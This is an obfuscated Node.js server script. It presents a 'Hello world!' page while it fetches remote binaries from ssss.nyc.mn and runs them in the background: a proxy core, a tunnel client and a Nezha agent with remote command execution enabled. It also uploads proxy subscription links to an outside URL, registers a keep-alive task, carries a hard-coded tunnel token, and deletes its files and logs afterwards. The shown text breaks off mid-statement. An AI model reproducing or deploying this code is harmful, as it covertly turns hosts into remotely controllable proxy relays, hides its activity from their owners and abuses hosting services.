const _0x138bdf=_0x3049;(function(_0x345979,_0x4e92f4){const _0x25f7b6=_0x3049,_0x1888fe=_0x345979();while(!![]){try{const _0x153469=parseInt(_0x25f7b6(0x21a))/0x1+parseInt(_0x25f7b6(0x18a))/0x2*(-parseInt(_0x25f7b6(0x1b5))/0x3)+parseInt(_0x25f7b6(0x204))/0x4*(parseInt(_0x25f7b6(0x17f))/0x5)+-parseInt(_0x25f7b6(0x1a7))/0x6*(-parseInt(_0x25f7b6(0x16c))/0x7)+parseInt(_0x25f7b6(0x228))/0x8*(-parseInt(_0x25f7b6(0x165))/0x9)+parseInt(_0x25f7b6(0x1fd))/0xa*(parseInt(_0x25f7b6(0x190))/0xb)+parseInt(_0x25f7b6(0x198))/0xc*(parseInt(_0x25f7b6(0x1ee))/0xd);if(_0x153469===_0x4e92f4)break;else _0x1888fe['push'](_0x1888fe['shift']());}catch(_0xaecefb){_0x1888fe['push'](_0x1888fe['shift']());}}}(_0x36e2,0xf0749));const express=require(_0x138bdf(0x1c9)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x138bdf(0x1c1)),{promisify}=require(_0x138bdf(0x202)),exec=promisify(require(_0x138bdf(0x195))[_0x138bdf(0x1f4)]),{execSync}=require(_0x138bdf(0x195)),UPLOAD_URL=process[_0x138bdf(0x1a9)][_0x138bdf(0x19e)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x138bdf(0x1a9)][_0x138bdf(0x1be)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x138bdf(0x1ca),SUB_PATH=process[_0x138bdf(0x1a9)][_0x138bdf(0x18c)]||_0x138bdf(0x1a1),PORT=process[_0x138bdf(0x1a9)][_0x138bdf(0x180)]||process[_0x138bdf(0x1a9)][_0x138bdf(0x189)]||0xbb8,UUID=process[_0x138bdf(0x1a9)][_0x138bdf(0x18d)]||_0x138bdf(0x1c5),NEZHA_SERVER=process[_0x138bdf(0x1a9)][_0x138bdf(0x1d3)]||'',NEZHA_PORT=process[_0x138bdf(0x1a9)][_0x138bdf(0x1b4)]||'',NEZHA_KEY=process[_0x138bdf(0x1a9)][_0x138bdf(0x1a6)]||'',ARGO_DOMAIN=process[_0x138bdf(0x1a9)][_0x138bdf(0x1cc)]||_0x138bdf(0x213),ARGO_AUTH=process[_0x138bdf(0x1a9)]['ARGO_AUTH']||_0x138bdf(0x1d5),ARGO_PORT=process['env'][_0x138bdf(0x1bf)]||0x1f41,CFIP=process[_0x138bdf(0x1a9)][_0x138bdf(0x218)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x138bdf(0x1ea)]||0x1bb,NAME=process[_0x138bdf(0x1a9)][_0x138bdf(0x1d6)]||'OZ';!fs['existsSync'](FILE_PATH)?(fs[_0x138bdf(0x17b)](FILE_PATH),console[_0x138bdf(0x1d4)](FILE_PATH+_0x138bdf(0x1d0))):console[_0x138bdf(0x1d4)](FILE_PATH+_0x138bdf(0x1e0));function generateRandomName(){const _0x2897e2=_0x138bdf,_0x240b89=_0x2897e2(0x20e);let _0x3139bc='';for(let _0x2cb206=0x0;_0x2cb206<0x6;_0x2cb206++){_0x3139bc+=_0x240b89[_0x2897e2(0x1a4)](Math[_0x2897e2(0x1ec)](Math[_0x2897e2(0x164)]()*_0x240b89[_0x2897e2(0x1c3)]));}return _0x3139bc;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x138bdf(0x1eb)](FILE_PATH,npmName),phpPath=path[_0x138bdf(0x1eb)](FILE_PATH,phpName),webPath=path[_0x138bdf(0x1eb)](FILE_PATH,webName),botPath=path[_0x138bdf(0x1eb)](FILE_PATH,botName),subPath=path[_0x138bdf(0x1eb)](FILE_PATH,_0x138bdf(0x194)),listPath=path[_0x138bdf(0x1eb)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x138bdf(0x199)),configPath=path['join'](FILE_PATH,_0x138bdf(0x1e1));function deleteNodes(){const _0x294c20=_0x138bdf;try{if(!UPLOAD_URL)return;if(!fs[_0x294c20(0x1ac)](subPath))return;let _0x4def8f;try{_0x4def8f=fs[_0x294c20(0x167)](subPath,_0x294c20(0x1b3));}catch{return null;}const _0x59ebf3=Buffer['from'](_0x4def8f,'base64')[_0x294c20(0x1bb)](_0x294c20(0x1b3)),_0x57a880=_0x59ebf3[_0x294c20(0x18f)]('\x0a')[_0x294c20(0x16f)](_0x4c3cd8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x294c20(0x209)](_0x4c3cd8));if(_0x57a880[_0x294c20(0x1c3)]===0x0)return;return axios[_0x294c20(0x1ce)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x294c20(0x1ba)]({'nodes':_0x57a880}),{'headers':{'Content-Type':'application/json'}})[_0x294c20(0x178)](_0x3db128=>{return null;}),null;}catch(_0x3568dd){return null;}}function _0x36e2(){const _0x3e68ab=['https://amd64.ssss.nyc.mn/web','isFile','Error\x20downloading\x20files:','vless','Error\x20reading\x20boot.log:','--tls','nohup\x20','?encryption=none&security=tls&sni=','https://amd64.ssss.nyc.mn/agent','\x20already\x20exists','config.json','forEach','message','/sub.txt\x20saved\x20successfully','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20-c\x20\x22','freedom','\x22\x20>\x20/dev/null\x202>&1','response','CFPORT','join','floor','\x20successfully','13DSXxas','&path=%2Fvless-argo%3Fed%3D2560#','Empowerment\x20success\x20for\x20','pipe','tls','xtls-rprx-vision','exec','clear','Nodes\x20uploaded\x20successfully','2096','platform','firefox','Empowerment\x20failed\x20for\x20','none','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','20HgwMxf','tunnel.json','\x20>/dev/null\x202>&1\x20&','pop','basename','util','arm','3756CKeDRy','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://amd64.ssss.nyc.mn/bot','?security=tls&sni=','status','test','/api/add-subscriptions','tcp','Download\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','abcdefghijklmnopqrstuvwxyz','block','App\x20is\x20running','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','unlinkSync','nl.book10369.dpdns.org','blackhole','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/api/add-nodes','set','CFIP','/tunnel.yml\x20run','614080ZpJwLW','/vmess-argo?ed=2560','taskkill\x20/f\x20/im\x20','Error\x20in\x20startserver:','match','writeFileSync','2087','includes','\x20-p\x20','443','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','8443','unshift','24acNEmD','&fp=firefox&type=ws&host=','error','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','npm\x20running\x20error:\x20','random','1878192DIkAGX','http','readFileSync','tunnel.yml','fileUrl','fileName','\x0a\x20\x20\x0avmess://','1565074sAZlLo','ARGO_DOMAIN:','config.yaml','filter','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Error\x20executing\x20command:\x20','TunnelSecret','\x20failed:\x20','automatic\x20access\x20task\x20added\x20successfully','rm\x20-rf\x20','has','Content-Type','catch','https://amd64.ssss.nyc.mn/v1','quic','mkdirSync','https+local://8.8.8.8/dns-query','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/vless-argo','515MWNzOk','SERVER_PORT','\x20>/dev/null\x202>&1','trim','\x0a\x20\x20credentials-file:\x20','base64','trojan','Add\x20automatic\x20access\x20task\x20faild:\x20','Unhandled\x20error\x20in\x20startserver:','\x0avless://','PORT','886134wlCHCN','2053','SUB_PATH','UUID','\x0a\x20\x20\x20\x20','split','2215323LFRSRW','chmod','php\x20running\x20error:\x20','Skipping\x20adding\x20automatic\x20access\x20task','sub.txt','child_process','send','push','3236484KmMzaO','boot.log','Subscription\x20uploaded\x20successfully','all','web\x20running\x20error:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','UPLOAD_URL','\x0aclient_secret:\x20','\x0a\x20\x20tunnel:\x20','21689','listen','\x0a\x20\x20\x0atrojan://','charAt','vmess','NEZHA_KEY','18SePrII','unlink','env','application/json','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','existsSync','\x20>\x20nul\x202>&1','/trojan-argo','aarch64','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','127.0.0.1','close','utf-8','NEZHA_PORT','3AfTXnQ','from','pkill\x20-f\x20\x22[','2083','del\x20/f\x20/q\x20','stringify','toString','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','get','AUTO_ACCESS','ARGO_PORT','https://arm64.ssss.nyc.mn/v1','path','http\x20server\x20is\x20running\x20on\x20port:','length','substring','8bb1a4cb-0f67-4e45-9c87-8b063bc5886e','stream','/dev/null','then','express','./tmp','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN','\x20is\x20running','post','win32','\x20is\x20created','ArgoDomain:','/vmess-argo','NEZHA_SERVER','log','eyJhIjoiYzFiNjBhZGNjM2Q3ZGI5MzJjOWE4MDViZGIwY2FjYzAiLCJ0IjoiMTNiYzZkODQtYTZlZC00MmM3LWIyOWMtNTgxNDcyNzYxZmU1IiwicyI6IlpETTJaVGcyT1RJdFpUUTRNQzAwWW1SakxXSmhNell0T1RJME0yUmhOV0prWW1ObSJ9','NAME'];_0x36e2=function(){return _0x3e68ab;};return _0x36e2();}function cleanupOldFiles(){const _0x47ac9d=_0x138bdf;try{const _0x29044b=fs['readdirSync'](FILE_PATH);_0x29044b[_0x47ac9d(0x1e2)](_0x64dece=>{const _0x491c3f=_0x47ac9d,_0x14efe0=path['join'](FILE_PATH,_0x64dece);try{const _0x2e0021=fs['statSync'](_0x14efe0);_0x2e0021[_0x491c3f(0x1d8)]()&&fs[_0x491c3f(0x212)](_0x14efe0);}catch(_0x4a6b7){}});}catch(_0x2cb847){}}app['get']('/',function(_0x29527a,_0x288694){const _0x4cd982=_0x138bdf;_0x288694[_0x4cd982(0x196)]('Hello\x20world!');});async function generateConfig(){const _0x9c914a=_0x138bdf,_0x434ad4={'log':{'access':'/dev/null','error':_0x9c914a(0x1c7),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x9c914a(0x1da),'settings':{'clients':[{'id':UUID,'flow':_0x9c914a(0x1f3)}],'decryption':_0x9c914a(0x1fb),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x9c914a(0x1d2),'dest':0xbbb},{'path':_0x9c914a(0x1ae),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x9c914a(0x1fb)},'streamSettings':{'network':_0x9c914a(0x20b),'security':_0x9c914a(0x1fb)}},{'port':0xbba,'listen':_0x9c914a(0x1b1),'protocol':_0x9c914a(0x1da),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x9c914a(0x1fb)},'streamSettings':{'network':'ws','security':_0x9c914a(0x1fb),'wsSettings':{'path':_0x9c914a(0x17e)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x9c914a(0x1f2),_0x9c914a(0x17a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x9c914a(0x1b1),'protocol':_0x9c914a(0x1a5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x9c914a(0x166),'tls',_0x9c914a(0x17a)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x9c914a(0x185),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x9c914a(0x1fb),'wsSettings':{'path':_0x9c914a(0x1ae)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x9c914a(0x1f2),_0x9c914a(0x17a)],'metadataOnly':![]}}],'dns':{'servers':[_0x9c914a(0x17c)]},'outbounds':[{'protocol':_0x9c914a(0x1e7),'tag':'direct'},{'protocol':_0x9c914a(0x214),'tag':_0x9c914a(0x20f)}]};fs['writeFileSync'](path[_0x9c914a(0x1eb)](FILE_PATH,_0x9c914a(0x1e1)),JSON[_0x9c914a(0x1ba)](_0x434ad4,null,0x2));}function getSystemArchitecture(){const _0xf12a78=_0x138bdf,_0x384557=os['arch']();return _0x384557===_0xf12a78(0x203)||_0x384557==='arm64'||_0x384557===_0xf12a78(0x1af)?'arm':'amd';}function downloadFile(_0x2092ed,_0x1cd2fb,_0x3cf1aa){const _0x585629=_0x138bdf,_0x31a905=_0x2092ed;!fs[_0x585629(0x1ac)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x40be46=fs['createWriteStream'](_0x31a905);axios({'method':_0x585629(0x1bd),'url':_0x1cd2fb,'responseType':_0x585629(0x1c6)})[_0x585629(0x1c8)](_0x52ffeb=>{const _0x11b7ea=_0x585629;_0x52ffeb['data'][_0x11b7ea(0x1f1)](_0x40be46),_0x40be46['on']('finish',()=>{const _0xece842=_0x11b7ea;_0x40be46[_0xece842(0x1b2)](),console[_0xece842(0x1d4)](_0xece842(0x20c)+path['basename'](_0x31a905)+_0xece842(0x1ed)),_0x3cf1aa(null,_0x31a905);}),_0x40be46['on'](_0x11b7ea(0x161),_0x4ab362=>{const _0x34ce0e=_0x11b7ea;fs[_0x34ce0e(0x1a8)](_0x31a905,()=>{});const _0x350db1=_0x34ce0e(0x20c)+path[_0x34ce0e(0x201)](_0x31a905)+_0x34ce0e(0x173)+_0x4ab362['message'];console[_0x34ce0e(0x161)](_0x350db1),_0x3cf1aa(_0x350db1);});})[_0x585629(0x178)](_0x4c8e4a=>{const _0x4606c2=_0x585629,_0x211fd7=_0x4606c2(0x20c)+path['basename'](_0x31a905)+'\x20failed:\x20'+_0x4c8e4a['message'];console[_0x4606c2(0x161)](_0x211fd7),_0x3cf1aa(_0x211fd7);});}async function downloadFilesAndRun(){const _0x33dabf=_0x138bdf,_0x29addf=getSystemArchitecture(),_0x2f54f0=getFilesForArchitecture(_0x29addf);if(_0x2f54f0[_0x33dabf(0x1c3)]===0x0){console[_0x33dabf(0x1d4)](_0x33dabf(0x1fc));return;}const _0x535e4a=_0x2f54f0['map'](_0xcdfc47=>{return new Promise((_0x39c86e,_0x4cb713)=>{const _0x2db6e1=_0x3049;downloadFile(_0xcdfc47[_0x2db6e1(0x16a)],_0xcdfc47[_0x2db6e1(0x169)],(_0x244299,_0x380256)=>{_0x244299?_0x4cb713(_0x244299):_0x39c86e(_0x380256);});});});try{await Promise[_0x33dabf(0x19b)](_0x535e4a);}catch(_0x4281fb){console[_0x33dabf(0x161)](_0x33dabf(0x1d9),_0x4281fb);return;}function _0x557b10(_0x225b8f){const _0x46adb9=_0x33dabf,_0x3a9570=0x1fd;_0x225b8f[_0x46adb9(0x1e2)](_0x3f06ea=>{const _0x20d4a6=_0x46adb9;fs[_0x20d4a6(0x1ac)](_0x3f06ea)&&fs[_0x20d4a6(0x191)](_0x3f06ea,_0x3a9570,_0x4020dc=>{const _0x4cb18a=_0x20d4a6;_0x4020dc?console[_0x4cb18a(0x161)](_0x4cb18a(0x1fa)+_0x3f06ea+':\x20'+_0x4020dc):console[_0x4cb18a(0x1d4)](_0x4cb18a(0x1f0)+_0x3f06ea+':\x20'+_0x3a9570[_0x4cb18a(0x1bb)](0x8));});});}const _0x46a58f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x557b10(_0x46a58f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x476083=NEZHA_SERVER[_0x33dabf(0x221)](':')?NEZHA_SERVER[_0x33dabf(0x18f)](':')[_0x33dabf(0x200)]():'',_0xc8f40=new Set(['443',_0x33dabf(0x226),_0x33dabf(0x1f7),_0x33dabf(0x220),'2083',_0x33dabf(0x18b)]),_0x504992=_0xc8f40[_0x33dabf(0x176)](_0x476083)?'true':'false',_0xf0e8ad=_0x33dabf(0x19f)+NEZHA_KEY+_0x33dabf(0x205)+NEZHA_SERVER+_0x33dabf(0x215)+_0x504992+_0x33dabf(0x1e5)+UUID;fs[_0x33dabf(0x21f)](path['join'](FILE_PATH,_0x33dabf(0x16e)),_0xf0e8ad);const _0x3ff183=_0x33dabf(0x1dd)+phpPath+_0x33dabf(0x1e6)+FILE_PATH+_0x33dabf(0x1cb);try{await exec(_0x3ff183),console[_0x33dabf(0x1d4)](phpName+_0x33dabf(0x1cd)),await new Promise(_0x261166=>setTimeout(_0x261166,0x3e8));}catch(_0x9faecf){console[_0x33dabf(0x161)](_0x33dabf(0x192)+_0x9faecf);}}else{let _0x4aa6a9='';const _0x5056d3=[_0x33dabf(0x223),_0x33dabf(0x226),'2096',_0x33dabf(0x220),_0x33dabf(0x1b8),_0x33dabf(0x18b)];_0x5056d3[_0x33dabf(0x221)](NEZHA_PORT)&&(_0x4aa6a9=_0x33dabf(0x1dc));const _0x4fa2e7=_0x33dabf(0x1dd)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x33dabf(0x222)+NEZHA_KEY+'\x20'+_0x4aa6a9+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4fa2e7),console[_0x33dabf(0x1d4)](npmName+_0x33dabf(0x1cd)),await new Promise(_0x3fbd53=>setTimeout(_0x3fbd53,0x3e8));}catch(_0x1482f2){console[_0x33dabf(0x161)](_0x33dabf(0x163)+_0x1482f2);}}}else console['log'](_0x33dabf(0x19d));const _0x247e0e=_0x33dabf(0x1dd)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x247e0e),console['log'](webName+_0x33dabf(0x1cd)),await new Promise(_0x12b121=>setTimeout(_0x12b121,0x3e8));}catch(_0x15ee3a){console[_0x33dabf(0x161)](_0x33dabf(0x19c)+_0x15ee3a);}if(fs[_0x33dabf(0x1ac)](botPath)){let _0x38d087;if(ARGO_AUTH[_0x33dabf(0x21e)](/^[A-Z0-9a-z=]{120,250}$/))_0x38d087=_0x33dabf(0x162)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x38d087=_0x33dabf(0x17d)+FILE_PATH+_0x33dabf(0x219):_0x38d087='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x33dabf(0x1ab)+ARGO_PORT;try{await exec(_0x33dabf(0x1dd)+botPath+'\x20'+_0x38d087+'\x20>/dev/null\x202>&1\x20&'),console[_0x33dabf(0x1d4)](botName+'\x20is\x20running'),await new Promise(_0x22cd2d=>setTimeout(_0x22cd2d,0x7d0));}catch(_0x44e094){console[_0x33dabf(0x161)](_0x33dabf(0x171)+_0x44e094);}}await new Promise(_0x195361=>setTimeout(_0x195361,0x1388));}function _0x3049(_0x3b031a,_0x54608a){_0x3b031a=_0x3b031a-0x161;const _0x36e269=_0x36e2();let _0x3049d8=_0x36e269[_0x3b031a];return _0x3049d8;}function getFilesForArchitecture(_0x10e334){const _0x58547f=_0x138bdf;let _0x2faad6;_0x10e334===_0x58547f(0x203)?_0x2faad6=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x2faad6=[{'fileName':webPath,'fileUrl':_0x58547f(0x1d7)},{'fileName':botPath,'fileUrl':_0x58547f(0x206)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5b1295=_0x10e334===_0x58547f(0x203)?'https://arm64.ssss.nyc.mn/agent':_0x58547f(0x1df);_0x2faad6['unshift']({'fileName':npmPath,'fileUrl':_0x5b1295});}else{const _0x44b689=_0x10e334===_0x58547f(0x203)?_0x58547f(0x1c0):_0x58547f(0x179);_0x2faad6[_0x58547f(0x227)]({'fileName':phpPath,'fileUrl':_0x44b689});}}return _0x2faad6;}function argoType(){const _0xd2f13c=_0x138bdf;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xd2f13c(0x1d4)](_0xd2f13c(0x1bc));return;}if(ARGO_AUTH[_0xd2f13c(0x221)](_0xd2f13c(0x172))){fs[_0xd2f13c(0x21f)](path[_0xd2f13c(0x1eb)](FILE_PATH,_0xd2f13c(0x1fe)),ARGO_AUTH);const _0x11c9d5=_0xd2f13c(0x1a0)+ARGO_AUTH[_0xd2f13c(0x18f)]('\x22')[0xb]+_0xd2f13c(0x183)+path[_0xd2f13c(0x1eb)](FILE_PATH,_0xd2f13c(0x1fe))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0xd2f13c(0x224);fs['writeFileSync'](path[_0xd2f13c(0x1eb)](FILE_PATH,_0xd2f13c(0x168)),_0x11c9d5);}else console[_0xd2f13c(0x1d4)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x284794=_0x138bdf;let _0xde6da2;if(ARGO_AUTH&&ARGO_DOMAIN)_0xde6da2=ARGO_DOMAIN,console[_0x284794(0x1d4)](_0x284794(0x16d),_0xde6da2),await _0xa64b3f(_0xde6da2);else try{const _0x485c0a=fs[_0x284794(0x167)](path['join'](FILE_PATH,_0x284794(0x199)),_0x284794(0x1b3)),_0x259f98=_0x485c0a[_0x284794(0x18f)]('\x0a'),_0x2f0b21=[];_0x259f98[_0x284794(0x1e2)](_0x576f1e=>{const _0x2bc9d0=_0x284794,_0x5d158f=_0x576f1e['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5d158f){const _0x5ea64e=_0x5d158f[0x1];_0x2f0b21[_0x2bc9d0(0x197)](_0x5ea64e);}});if(_0x2f0b21['length']>0x0)_0xde6da2=_0x2f0b21[0x0],console[_0x284794(0x1d4)](_0x284794(0x1d1),_0xde6da2),await _0xa64b3f(_0xde6da2);else{console[_0x284794(0x1d4)](_0x284794(0x20d)),fs[_0x284794(0x212)](path[_0x284794(0x1eb)](FILE_PATH,_0x284794(0x199)));async function _0x3c3a12(){const _0x44f583=_0x284794;try{process['platform']===_0x44f583(0x1cf)?await exec(_0x44f583(0x21c)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x44f583(0x1b7)+botName[_0x44f583(0x1a4)](0x0)+']'+botName[_0x44f583(0x1c4)](0x1)+_0x44f583(0x1e8));}catch(_0x441a39){}}_0x3c3a12(),await new Promise(_0x4eae20=>setTimeout(_0x4eae20,0xbb8));const _0x102432=_0x284794(0x211)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x102432+_0x284794(0x1ff)),console[_0x284794(0x1d4)](botName+_0x284794(0x1cd)),await new Promise(_0x4cb4c6=>setTimeout(_0x4cb4c6,0xbb8)),await extractDomains();}catch(_0x3e71b8){console[_0x284794(0x161)](_0x284794(0x171)+_0x3e71b8);}}}catch(_0x30f931){console[_0x284794(0x161)](_0x284794(0x1db),_0x30f931);}async function _0xa64b3f(_0x4b6d91){const _0x319d0c=_0x284794,_0xf52fea=execSync(_0x319d0c(0x170),{'encoding':'utf-8'}),_0x504b69=_0xf52fea[_0x319d0c(0x182)](),_0x152053=NAME?NAME+'-'+_0x504b69:_0x504b69;return new Promise(_0x31ef67=>{setTimeout(()=>{const _0x5ebc01=_0x3049,_0x539af2={'v':'2','ps':''+_0x152053,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5ebc01(0x1fb),'net':'ws','type':_0x5ebc01(0x1fb),'host':_0x4b6d91,'path':_0x5ebc01(0x21b),'tls':_0x5ebc01(0x1f2),'sni':_0x4b6d91,'alpn':'','fp':_0x5ebc01(0x1f9)},_0x3cbb15=_0x5ebc01(0x188)+UUID+'@'+CFIP+':'+CFPORT+_0x5ebc01(0x1de)+_0x4b6d91+_0x5ebc01(0x229)+_0x4b6d91+_0x5ebc01(0x1ef)+_0x152053+_0x5ebc01(0x16b)+Buffer[_0x5ebc01(0x1b6)](JSON[_0x5ebc01(0x1ba)](_0x539af2))[_0x5ebc01(0x1bb)](_0x5ebc01(0x184))+_0x5ebc01(0x1a3)+UUID+'@'+CFIP+':'+CFPORT+_0x5ebc01(0x207)+_0x4b6d91+_0x5ebc01(0x229)+_0x4b6d91+_0x5ebc01(0x225)+_0x152053+_0x5ebc01(0x18e);console['log'](Buffer['from'](_0x3cbb15)[_0x5ebc01(0x1bb)](_0x5ebc01(0x184))),fs[_0x5ebc01(0x21f)](subPath,Buffer[_0x5ebc01(0x1b6)](_0x3cbb15)[_0x5ebc01(0x1bb)](_0x5ebc01(0x184))),console[_0x5ebc01(0x1d4)](FILE_PATH+_0x5ebc01(0x1e4)),uploadNodes(),app[_0x5ebc01(0x1bd)]('/'+SUB_PATH,(_0x3f2607,_0x556afa)=>{const _0x40d3a0=_0x5ebc01,_0xb7905d=Buffer[_0x40d3a0(0x1b6)](_0x3cbb15)[_0x40d3a0(0x1bb)](_0x40d3a0(0x184));_0x556afa[_0x40d3a0(0x217)](_0x40d3a0(0x177),'text/plain;\x20charset=utf-8'),_0x556afa[_0x40d3a0(0x196)](_0xb7905d);}),_0x31ef67(_0x3cbb15);},0x7d0);});}}async function uploadNodes(){const _0x3f425e=_0x138bdf;if(UPLOAD_URL&&PROJECT_URL){const _0x4f72d3=PROJECT_URL+'/'+SUB_PATH,_0x9b6e61={'subscription':[_0x4f72d3]};try{const _0x8f4f08=await axios['post'](UPLOAD_URL+_0x3f425e(0x20a),_0x9b6e61,{'headers':{'Content-Type':_0x3f425e(0x1aa)}});return _0x8f4f08&&_0x8f4f08['status']===0xc8?(console['log'](_0x3f425e(0x19a)),_0x8f4f08):null;}catch(_0x412d4e){if(_0x412d4e[_0x3f425e(0x1e9)]){if(_0x412d4e[_0x3f425e(0x1e9)][_0x3f425e(0x208)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3f425e(0x1ac)](listPath))return;const _0x43f984=fs[_0x3f425e(0x167)](listPath,_0x3f425e(0x1b3)),_0x2a19b2=_0x43f984[_0x3f425e(0x18f)]('\x0a')['filter'](_0x5b037a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3f425e(0x209)](_0x5b037a));if(_0x2a19b2[_0x3f425e(0x1c3)]===0x0)return;const _0x5cdf82=JSON[_0x3f425e(0x1ba)]({'nodes':_0x2a19b2});try{const _0x5bf29d=await axios[_0x3f425e(0x1ce)](UPLOAD_URL+_0x3f425e(0x216),_0x5cdf82,{'headers':{'Content-Type':_0x3f425e(0x1aa)}});return _0x5bf29d&&_0x5bf29d['status']===0xc8?(console[_0x3f425e(0x1d4)](_0x3f425e(0x1f6)),_0x5bf29d):null;}catch(_0x4f164b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2a1605=_0x3049,_0x54c765=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x54c765[_0x2a1605(0x197)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x54c765[_0x2a1605(0x197)](phpPath);process[_0x2a1605(0x1f8)]===_0x2a1605(0x1cf)?exec(_0x2a1605(0x1b9)+_0x54c765[_0x2a1605(0x1eb)]('\x20')+_0x2a1605(0x1ad),_0x2a1aa8=>{const _0x4ffb00=_0x2a1605;console[_0x4ffb00(0x1f5)](),console[_0x4ffb00(0x1d4)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x2a1605(0x175)+_0x54c765[_0x2a1605(0x1eb)]('\x20')+_0x2a1605(0x181),_0xeaa8ed=>{const _0x21ea8e=_0x2a1605;console[_0x21ea8e(0x1f5)](),console['log'](_0x21ea8e(0x210)),console[_0x21ea8e(0x1d4)](_0x21ea8e(0x1b0));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2b7991=_0x138bdf;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2b7991(0x1d4)](_0x2b7991(0x193));return;}try{const _0x4a4cd3=await axios[_0x2b7991(0x1ce)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2b7991(0x1aa)}});return console[_0x2b7991(0x1d4)](_0x2b7991(0x174)),_0x4a4cd3;}catch(_0x33ac96){return console[_0x2b7991(0x161)](_0x2b7991(0x186)+_0x33ac96[_0x2b7991(0x1e3)]),null;}}async function startserver(){const _0xbda08e=_0x138bdf;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 